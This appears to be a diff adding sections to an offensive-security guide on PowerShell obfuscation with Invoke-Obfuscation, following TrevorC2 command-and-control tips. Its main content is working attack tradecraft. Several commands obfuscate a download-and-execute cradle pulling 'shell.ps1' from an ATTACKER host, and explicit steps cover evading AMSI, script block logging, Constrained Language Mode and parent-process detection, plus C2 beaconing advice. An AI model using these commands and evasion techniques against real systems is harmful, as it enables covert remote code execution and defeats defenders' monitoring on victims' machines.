@@ -302,3 +302,102 @@ python3 trevorc2/trevorc2_server.py
 #    - TLS: use a valid cert (Let's Encrypt) — traffic looks like HTTPS browsing
 #    - Poll interval: 60-300s avoids beaconing anomaly detection
 #    - Obfuscate agent each time before delivery — unique hash per target</code></pre>
+
+  <h2>Invoke-Obfuscation</h2>
+  <p>Invoke-Obfuscation by Daniel Bohannon is the most comprehensive PowerShell obfuscation framework. It systematically applies token-level obfuscation, string encoding, and launch technique abstraction to any PowerShell command or script. Originally built to help blue teams enumerate detection coverage, it is widely used offensively to bypass AMSI signatures and EDR string matching.</p>
+  <pre><code># Install and launch:
+git clone https://github.com/danielbohannon/Invoke-Obfuscation
+cd Invoke-Obfuscation
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+
+# Or via CLI (non-interactive — scriptable):
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')} -Command 'Token\All\1,Encoding\1,Launcher\Stdin++\234,Clip' -Quiet -NoExit</code></pre>
+
+  <h3>Obfuscation Categories</h3>
+  <pre><code># TOKEN — Obfuscates individual PowerShell tokens (strings, members, variables, etc.)
+TOKEN\STRING\1      # string delimiters and concatenation
+TOKEN\STRING\2      # reordered string fragments
+TOKEN\MEMBER\1      # dot notation → &amp; operator calls
+TOKEN\VARIABLE\1    # variable name randomization
+TOKEN\WHITESPACE\1  # insert random whitespace
+TOKEN\COMMENT\1     # insert inline comments
+TOKEN\ALL\1         # apply all token obfuscation layers
+
+# STRING — Obfuscates at the script string level
+STRING\1            # string reversal
+STRING\2            # PowerShell format operator (-f) reordering
+STRING\3            # ASCII char array concatenation
+
+# ENCODING — Encodes the full script
+ENCODING\1          # ASCII
+ENCODING\2          # hex encoding
+ENCODING\3          # octal encoding
+ENCODING\4          # binary encoding
+ENCODING\5          # SecureString (password encryption)
+ENCODING\6          # BXOR (XOR against random key)
+
+# LAUNCHER — Abstracts how PowerShell is launched (pushes cmd away from powershell.exe)
+LAUNCHER\PS\1       # standard powershell.exe with -EncodedCommand
+LAUNCHER\CLIP+\1    # uses clipboard — powershell reads from clipboard
+LAUNCHER\WMIC\1     # WMIC.exe launches PowerShell (parent = wmic.exe)
+LAUNCHER\MSHTA\1    # mshta.exe → JScript → launches PowerShell
+LAUNCHER\RUNDLL32   # rundll32.exe as parent
+LAUNCHER\REGASM     # regasm.exe as parent
+LAUNCHER\STDIN++    # pipe from stdin — no encoded command in cmdline</code></pre>
+
+  <h3>Common Obfuscation Pipelines</h3>
+  <pre><code># Interactive pipeline (in Invoke-Obfuscation console):
+# Set script block:
+SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')
+
+# Apply layered obfuscation:
+TOKEN\ALL\1         # token-level obfuscation
+STRING\3            # ASCII char array
+ENCODING\5          # SecureString encryption
+LAUNCHER\WMIC\1     # launch via wmic.exe
+
+# Copy result to clipboard: OUT or CLIP
+
+# CLI one-liner for automation:
+Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')} \
+  -Command 'Token\All\1,String\3,Encoding\5,Launcher\Wmic\1' \
+  -Quiet
+
+# Regex-based multi-match (obfuscate ALL STRING and ENCODING variations):
+Invoke-Obfuscation -ScriptBlock {...} -Command 'Token\*\*,String\[13],Encoding\(1|5)' -Quiet
+
+# UNDO last obfuscation layer:
+UNDO</code></pre>
+
+  <h3>Specific Techniques for Detection Bypass</h3>
+  <pre><code"># Script Block Logging bypass:
+# PSv2 doesn't support Script Block Logging — use Launcher\PS\2 (forces PSv2)
+LAUNCHER\PS\2
+
+# Constrained Language Mode evasion — use TOKEN obfuscation to avoid known CLM bypasses
+# CLM blocks: Add-Type, [System.Type]::GetType(), COM objects
+# Approach: obfuscate the bypass payload before CLM checks the string content
+
+# AMSI bypass via encoding:
+# AMSI scans the script block before execution
+# Encoding\5 (SecureString) decrypts in-memory — some AMSI versions miss this
+ENCODING\5
+
+# WMIC launcher — parent process evasion:
+# cmd.exe or wmic.exe spawns powershell.exe → avoids "powershell.exe spawned by
+# suspicious parent" detections
+LAUNCHER\WMIC\1
+
+# Process argument tree comparison (built-in to Invoke-Obfuscation):
+# After generating a launcher, Invoke-Obfuscation shows the full process tree
+# Use this to understand the parent/child relationship your payload creates</code></pre>
+
+  <h2>Resources</h2>
+  <ul>
+    <li>Invoke-Obfuscation — <code>github.com/danielbohannon/Invoke-Obfuscation</code></li>
+    <li>Daniel Bohannon's DerbyCon 6.0 talk — <code>github.com/danielbohannon/Invoke-Obfuscation/blob/master/README.md</code></li>
+    <li>MITRE ATT&amp;CK T1027.010 — Obfuscated Files or Information: Command Obfuscation — <code>attack.mitre.org/techniques/T1027/010/</code></li>
+    <li>Revoke-Obfuscation (detection) — <code>github.com/danielbohannon/Revoke-Obfuscation</code></li>
+  </ul>
